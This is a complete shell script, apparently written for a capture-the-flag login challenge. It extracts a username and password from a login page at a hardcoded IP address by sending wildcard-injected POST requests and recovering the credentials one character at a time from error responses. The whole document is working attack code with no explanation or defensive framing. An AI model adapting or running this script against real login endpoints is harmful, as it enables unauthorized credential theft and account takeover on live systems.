#!/bin/sh
# author: mind2hex

charset=( "a" "b" "c" "d" "e" "f" "g" "h" "i" "j" "k" "l" "m" "n" "o" "p" "q" "r" "s" "t" "u" "v" "w" "x" "y" "z" "A" "B" "C" "D" "E" "F" "G" "H" "I" "J" "K" "L" "M" "N" "O" "P" "Q" "R" "S" "T" "U" "V" "W" "X" "Y" "Z" "0" "1" "2" "3" "4" "5" "6" "7" "8" "9" "[" "]" "{" "}" "|" "(" ")" "!" "@" "$" "%" "^" "_" "-" "=" )
target="http://178.128.163.230:32592/login"

# guessing username and password
# if u already have username just change username_status for true and fill username variable with the username 
username_status=true
username="reese"
password_status=false
password=""
while true;do
	status=false
	# iterating through ascii printable characters
	for char in "${charset[@]}";do

		# unmark to get more info
		# curl -s -X POST --data "username=${username}${char}*&password=*" ${target} -i
		if [[ $username_status == false ]];then
			response=$(curl -s -X POST --data "username=${username}${char}*&password=*" ${target} -i | grep -o -E -i "(failed|error)" )
			echo -ne "Trying ${username}${char}* \r"
		elif [[ $password_status == false ]];then
			response=$(curl -s -X POST --data "username=${username}&password=${password}${char}*" ${target} -i | grep -o -E -i "(failed|error)" )
			echo -ne "Trying ${password}${char}* \r"
		fi

		# unmark to get more info
		# echo ${response}


		if [[ -z $response ]];then
			if [[ $username_status == false ]];then
				username=${username}${char}
			elif [[ $password_status == false ]];then
				password=${password}${char}
			fi
			status=true
			break
		fi
	done

	if [[ $status == false ]];then
		if [[ $username_status == false ]];then
			echo -e "\n[!] Username found: ${username}"
			username_status=true
		elif [[ $password_status == false ]];then
			echo -e "\n[!] Password found: ${password}"
			break
		fi
	fi

done

